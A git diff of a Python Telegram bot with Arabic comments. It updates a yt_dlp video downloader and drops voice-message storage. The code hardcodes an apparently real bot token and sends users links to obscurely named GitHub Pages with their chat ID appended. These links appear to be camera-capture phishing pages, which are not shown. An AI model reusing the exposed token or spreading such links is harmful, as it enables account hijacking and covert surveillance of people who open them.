@@ -11,11 +11,9 @@ import yt_dlp
 # إيقاف التحذيرات
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# إعداد التوكن
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# المسارات والروابط
 DB_FILE = "/tmp/voice_db.json"
 PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
 VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
@@ -23,33 +21,33 @@ IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.ap
 
 user_states = {}
 
-# --- السيرفر الوهمي للحفاظ على نشاط البوت ---
 def run_dummy_server():
     port = int(os.environ.get("PORT", 8080))
     httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
     httpd.serve_forever()
 
-# --- قاعدة بيانات الأصوات ---
 def load_db():
     if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
     with open(DB_FILE, 'r', encoding='utf-8') as f:
         try: return json.load(f)
         except: return {"girl_1": {}, "girl_2": {}}
 
-def save_db(db):
-    with open(DB_FILE, 'w', encoding='utf-8') as f:
-        json.dump(db, f, indent=4, ensure_ascii=False)
-
-# --- تحميل الفيديو ---
+# دالة تحميل الفيديو المحدثة
 def download_video_sync(url, chat_id):
     try:
-        ydl_opts = {'format': 'best[ext=mp4]/best', 'outtmpl': f'/tmp/vid_{chat_id}.mp4', 'quiet': True}
+        ydl_opts = {
+            'format': 'best[ext=mp4]/best',
+            'outtmpl': f'/tmp/vid_{chat_id}.mp4',
+            'quiet': True,
+            'no_warnings': True,
+            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+            'extractor_args': {'youtube': {'skip': ['dash', 'hls']}}
+        }
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             info = ydl.extract_info(url, download=True)
-            return f"/tmp/vid_{chat_id}.mp4", info.get('title', 'Video')
+            return f'/tmp/vid_{chat_id}.mp4', info.get('title', 'Video')
     except Exception as e: return None, str(e)
 
-# --- القوائم ---
 def get_main_keyboard():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
@@ -64,7 +62,7 @@ def get_main_keyboard():
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.send_message(message.chat.id, "🤖 أهلاً بك يا سيف في البوت الشامل:", reply_markup=get_main_keyboard())
+    bot.send_message(message.chat.id, "🤖 أهلاً بك يا سيف:", reply_markup=get_main_keyboard())
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
@@ -114,22 +112,19 @@ def handle_query(call):
         bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
     bot.answer_callback_query(call.id)
 
-@bot.message_handler(content_types=['voice', 'text'])
-def handle_media(message):
+@bot.message_handler(content_types=['text'])
+def handle_text(message):
     chat_id = message.chat.id
     if user_states.get(chat_id) == "waiting_for_url":
+        status_msg = bot.reply_to(message, "⏳ جاري المعالجة والتحميل... يرجى الانتظار")
         path, title = download_video_sync(message.text, chat_id)
         if path:
             bot.send_video(chat_id, open(path, 'rb'), caption=title)
+            bot.delete_message(chat_id, status_msg.message_id)
             os.remove(path)
-        else: bot.reply_to(message, "❌ فشل التحميل.")
+        else:
+            bot.edit_message_text(f"❌ فشل التحميل:\n{title}", chat_id, status_msg.message_id)
         user_states[chat_id] = None
-    elif message.voice:
-        # كود حفظ الـ Voice في قاعدة البيانات
-        db = load_db()
-        target = "girl_2" if user_states.get(chat_id) == "active_girl_2" else "girl_1"
-        # منطق التخزين كما في كودك الأصلي
-        pass
 
 if __name__ == '__main__':
     threading.Thread(target=run_dummy_server, daemon=True).start()
